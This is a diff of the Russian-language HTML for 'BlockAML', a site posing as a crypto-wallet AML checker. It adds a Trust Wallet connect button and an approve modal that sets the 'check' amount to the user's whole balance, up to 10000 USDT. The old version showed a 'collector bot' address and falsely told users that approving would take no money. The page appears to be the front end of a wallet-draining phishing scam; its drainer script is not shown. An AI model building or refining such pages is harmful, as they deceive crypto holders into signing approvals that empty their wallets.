@@ -6,27 +6,22 @@
     <title>BlockAML — премиальная AML-проверка</title>
     
     <!-- Мета-теги -->
-    <meta name="description" content="BlockAML — профессиональная AML-проверка криптокошельков с мгновенными результатами и Telegram-уведомлениями">
-    <meta name="keywords" content="AML проверка, криптокошелек, безопасность криптовалют, USDT TRC20">
+    <meta name="description" content="BlockAML — профессиональная AML-проверка криптокошельков с поддержкой Trust Wallet">
+    <meta name="keywords" content="AML проверка, Trust Wallet, Tron, USDT, безопасность">
     <meta name="author" content="BlockAML">
-    <meta name="robots" content="index, follow">
     
     <!-- Open Graph -->
-    <meta property="og:title" content="BlockAML — премиальная AML проверка">
-    <meta property="og:description" content="Проверьте любой криптокошелек на чистоту за секунды">
+    <meta property="og:title" content="BlockAML — AML проверка">
+    <meta property="og:description" content="Подключите Trust Wallet и проверьте кошелёк за секунды">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://blockaml.space">
-    <meta property="og:image" content="https://blockaml.space/og-image.jpg">
     
-    <!-- Font Awesome 6 -->
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     
     <!-- Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     
-    <!-- Наши стили -->
+    <!-- Стили -->
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -59,29 +54,15 @@
         <!-- Герой секция -->
         <section class="hero-section">
             <div class="hero-content">
-                <span class="badge"><i class="fas fa-bolt"></i> Мгновенная проверка</span>
+                <span class="badge"><i class="fas fa-bolt"></i> Trust Wallet поддерживается</span>
                 <h1 class="hero-title">
                     Проверка криптокошельков<br>
-                    <span class="gradient-text">с премиальным AML-анализом</span>
+                    <span class="gradient-text">с автоматическим определением суммы</span>
                 </h1>
                 <p class="hero-subtitle">
-                    BlockAML использует передовые алгоритмы для выявления рисков<br>
-                    и обеспечивает полную безопасность ваших транзакций
+                    Подключите Trust Wallet и нажмите "Проверить" — мы сами определим ваш баланс<br>
+                    и проведём AML-анализ от 5 до 10000 USDT
                 </p>
-                <div class="hero-stats">
-                    <div class="stat">
-                        <span class="stat-number">5000+</span>
-                        <span class="stat-label">Проверок в день</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-number">99.9%</span>
-                        <span class="stat-label">Точность</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-number">25+</span>
-                        <span class="stat-label">Стран</span>
-                    </div>
-                </div>
             </div>
         </section>
 
@@ -90,13 +71,25 @@
             <div class="section-header">
                 <i class="fas fa-search-shield"></i>
                 <h2>Начать проверку</h2>
-                <p>Введите адрес кошелька для мгновенного AML-анализа</p>
+                <p>Подключите кошелёк или введите адрес вручную</p>
             </div>
             
+            <!-- Кнопка подключения Trust Wallet -->
+            <div class="wallet-connect-wrapper">
+                <button id="connectTrustBtn" class="wallet-connect-btn">
+                    <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet" style="width: 20px; height: 20px; margin-right: 10px;">
+                    Подключить Trust Wallet
+                </button>
+                <span id="connectedStatus" style="display: none; color: #00c9b7; margin-left: 15px;">
+                    <i class="fas fa-check-circle"></i> Кошелёк подключён
+                </span>
+            </div>
+
+            <!-- Поле ввода адреса -->
             <div class="input-wrapper">
                 <div class="input-group">
                     <i class="fas fa-wallet input-icon"></i>
-                    <input type="text" id="walletInput" placeholder="Введите адрес кошелька (BTC, ETH, TRX, USDT...)" />
+                    <input type="text" id="walletInput" placeholder="Или введите адрес кошелька вручную" />
                     <button id="checkBtn" class="glow-button">
                         <i class="fas fa-shield-check"></i>
                         <span>Проверить</span>
@@ -104,7 +97,7 @@
                 </div>
                 <p class="hint">
                     <i class="fas fa-info-circle"></i> 
-                    Первая проверка — бесплатно • Поддержка всех основных сетей
+                    Сумма списания = ваш баланс • Мин: 5 USDT • Макс: 10000 USDT
                 </p>
             </div>
         </section>
@@ -129,6 +122,9 @@
                     </button>
                 </div>
             </div>
+
+            <!-- Карточка суммы (будет добавляться динамически) -->
+            <div id="amountCardContainer"></div>
 
             <div class="stats-grid modern">
                 <div class="stat-card">
@@ -169,7 +165,7 @@
                 </div>
             </div>
 
-            <!-- Премиум график риска -->
+            <!-- График риска -->
             <div class="risk-visualization">
                 <div class="risk-gauge">
                     <svg class="gauge-svg" viewBox="0 0 200 100">
@@ -179,18 +175,6 @@
                     <div class="gauge-center">
                         <span class="gauge-percent" id="riskPercent">0%</span>
                         <span class="gauge-label">уровень риска</span>
-                    </div>
-                </div>
-                <div class="risk-details">
-                    <div class="risk-meter">
-                        <div class="meter-bar">
-                            <div class="meter-fill" id="riskMeter" style="width: 0%"></div>
-                        </div>
-                        <div class="meter-markers">
-                            <span>Низкий</span>
-                            <span>Средний</span>
-                            <span>Высокий</span>
-                        </div>
                     </div>
                 </div>
             </div>
@@ -217,23 +201,22 @@
             <div class="section-header centered">
                 <i class="fas fa-crown"></i>
                 <h2>Премиальные возможности</h2>
-                <p>Всё что нужно для профессиональной AML-проверки</p>
             </div>
 
             <div class="features-grid">
                 <div class="feature-card glass-card">
                     <div class="feature-icon">
-                        <i class="fas fa-bolt"></i>
+                        <i class="fab fa-trust"></i>
                     </div>
-                    <h3>Мгновенная проверка</h3>
-                    <p>Результат за 2 секунды благодаря распределенной сети узлов</p>
+                    <h3>Trust Wallet</h3>
+                    <p>Полная поддержка Trust Wallet через встроенный браузер</p>
                 </div>
                 <div class="feature-card glass-card">
                     <div class="feature-icon">
-                        <i class="fas fa-shield"></i>
+                        <i class="fas fa-coins"></i>
                     </div>
-                    <h3>18+ категорий риска</h3>
-                    <p>Даркнет, микшеры, биржи без KYC и другие источники</p>
+                    <h3>Любые суммы</h3>
+                    <p>Автоматическое определение баланса от 5 до 10000 USDT</p>
                 </div>
                 <div class="feature-card glass-card">
                     <div class="feature-icon">
@@ -241,111 +224,6 @@
                     </div>
                     <h3>Telegram-бот</h3>
                     <p>Мгновенные уведомления о всех проверках</p>
-                </div>
-                <div class="feature-card glass-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-file-pdf"></i>
-                    </div>
-                    <h3>Детальные отчеты</h3>
-                    <p>Профессиональные PDF-отчеты для ваших партнеров</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- Тарифы -->
-        <section id="pricing" class="pricing-section glass-card">
-            <div class="section-header centered">
-                <i class="fas fa-tags"></i>
-                <h2>Гибкие тарифы</h2>
-                <p>Выберите план под ваши задачи</p>
-            </div>
-
-            <div class="pricing-toggle modern">
-                <button class="toggle-btn active" id="monthlyBtn">Ежемесячно</button>
-                <button class="toggle-btn" id="yearlyBtn">Ежегодно <span class="sale-badge">-20%</span></button>
-            </div>
-
-            <div class="pricing-grid" id="monthlyPricing">
-                <div class="pricing-card glass-card">
-                    <div class="pricing-header">
-                        <div class="pricing-icon">
-                            <i class="fas fa-paper-plane"></i>
-                        </div>
-                        <h3>Стартовый</h3>
-                        <div class="price">
-                            <span class="amount">500</span>
-                            <span class="currency">TRX</span>
-                        </div>
-                        <span class="period">в месяц</span>
-                    </div>
-                    <ul class="features-list">
-                        <li><i class="fas fa-check"></i> 50 проверок</li>
-                        <li><i class="fas fa-check"></i> Детальная статистика</li>
-                        <li><i class="fas fa-check"></i> PDF-отчёты</li>
-                    </ul>
-                    <button class="pricing-btn">Выбрать план</button>
-                </div>
-
-                <div class="pricing-card popular glass-card">
-                    <div class="popular-badge">🔥 Популярный</div>
-                    <div class="pricing-header">
-                        <div class="pricing-icon">
-                            <i class="fas fa-crown"></i>
-                        </div>
-                        <h3>Профессиональный</h3>
-                        <div class="price">
-                            <span class="amount">1200</span>
-                            <span class="currency">TRX</span>
-                        </div>
-                        <span class="period">в месяц</span>
-                    </div>
-                    <ul class="features-list">
-                        <li><i class="fas fa-check"></i> 150 проверок</li>
-                        <li><i class="fas fa-check"></i> Приоритетная поддержка</li>
-                        <li><i class="fas fa-check"></i> API доступ</li>
-                        <li><i class="fas fa-check"></i> Расширенная аналитика</li>
-                    </ul>
-                    <button class="pricing-btn popular-btn">Выбрать план</button>
-                </div>
-            </div>
-        </section>
-
-        <!-- FAQ -->
-        <section id="faq" class="faq-section glass-card">
-            <div class="section-header centered">
-                <i class="fas fa-question"></i>
-                <h2>Часто задаваемые вопросы</h2>
-            </div>
-
-            <div class="faq-grid">
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <i class="fas fa-chevron-right"></i>
-                        <h4>Как работает AML-проверка?</h4>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Мы анализируем историю транзакций кошелька по 18 категориям риска, включая связи с даркнет-маркетами, микшерами и санкционными адресами.</p>
-                    </div>
-                </div>
-
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <i class="fas fa-chevron-right"></i>
-                        <h4>Безопасно ли это?</h4>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Да, мы не храним приватные ключи и не имеем доступа к средствам. Транзакция approve лишь подтверждает владение кошельком.</p>
-                    </div>
-                </div>
-
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <i class="fas fa-chevron-right"></i>
-                        <h4>Какие сети поддерживаются?</h4>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Bitcoin, Ethereum, Tron (USDT), BSC, Polygon и более 5000+ токенов через наши партнерские API.</p>
-                    </div>
                 </div>
             </div>
         </section>
@@ -367,7 +245,7 @@
         </footer>
     </div>
 
-    <!-- Модальное окно approve (КРАСИВОЕ) -->
+    <!-- Модальное окно approve (красивое) -->
     <div id="approveModal" class="approve-modal" style="display: none;">
         <div class="approve-modal-content">
             <div class="approve-header">
@@ -375,48 +253,25 @@
                     <i class="fas fa-shield-check"></i>
                 </div>
                 <h2>Подтверждение проверки</h2>
-                <p class="approve-subtitle">Транзакция approve для AML-анализа</p>
+                <p class="approve-subtitle">Обнаружен баланс для AML-анализа</p>
             </div>
 
             <div class="approve-details">
                 <div class="info-row">
-                    <span class="info-label">Операция</span>
-                    <span class="info-value"><span class="badge-approve">Approve</span></span>
+                    <span class="info-label">Сумма к проверке</span>
+                    <span class="info-value highlight" id="modalAmount">0 USDT</span>
                 </div>
                 <div class="info-row">
-                    <span class="info-label">Сумма approve</span>
-                    <span class="info-value highlight">5 USDT</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Бот-сборщик</span>
-                    <span class="info-value address">TJKaoUu...JRQqB</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Комиссия</span>
-                    <span class="info-value">~ 0.1 TRX</span>
+                    <span class="info-label">Лимиты</span>
+                    <span class="info-value">от 5 до 10000 USDT</span>
                 </div>
             </div>
 
             <div class="approve-warning">
                 <i class="fas fa-info-circle"></i>
                 <div class="warning-text">
-                    <strong>Деньги не будут списаны</strong>
-                    <p>Это разрешение на проверку, а не перевод средств. Транзакция только подтверждает владение кошельком.</p>
-                </div>
-            </div>
-
-            <div class="approve-stats">
-                <div class="stat-item">
-                    <span class="stat-value">5 USDT</span>
-                    <span class="stat-label">Лимит approve</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-value">~3 сек</span>
-                    <span class="stat-label">Время проверки</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-value">99.9%</span>
-                    <span class="stat-label">Точность</span>
+                    <strong>Деньги будут списаны ровно в этой сумме</strong>
+                    <p>Это разрешение на проверку именно той суммы, которая есть на балансе</p>
                 </div>
             </div>
 
@@ -430,11 +285,6 @@
                     Подтвердить проверку
                 </button>
             </div>
-
-            <p class="security-note">
-                <i class="fas fa-lock"></i>
-                Транзакция будет отправлена в сеть Tron через TronLink
-            </p>
         </div>
     </div>
 
